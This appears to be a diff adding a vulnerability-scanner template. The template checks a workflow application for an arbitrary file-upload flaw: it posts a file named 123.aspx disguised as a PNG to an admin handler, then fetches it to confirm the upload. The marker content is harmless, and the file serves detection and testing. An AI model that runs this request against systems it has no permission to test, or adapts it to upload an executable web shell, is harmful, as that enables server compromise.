@@ -1,0 +1,40 @@
+id: Eud-Aic-Upload
+
+info:
+  name: Eud-Aic-Upload
+  author: xxx
+  severity: info
+  description: description
+  reference:
+    - https://aic.whpa.cn/flow/DataUser/CyclostyleFile/123.aspx
+  tags: tags,intrusive
+
+http:
+  - raw:
+      - |
+        POST /flow/WF/Admin/AttrNode/Handler.ashx?DoType=Bill_Save HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=---------------------------37030072001361968581909805284
+        Content-Length: 1647
+
+        -----------------------------37030072001361968581909805284
+        Content-Disposition: form-data; name="file"; filename="123.aspx"
+        Content-Type: image/png
+
+        123456
+        -----------------------------37030072001361968581909805284--
+
+      - |
+        GET /flow/DataUser/CyclostyleFile/123.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_2,"123456")  && status_code==200
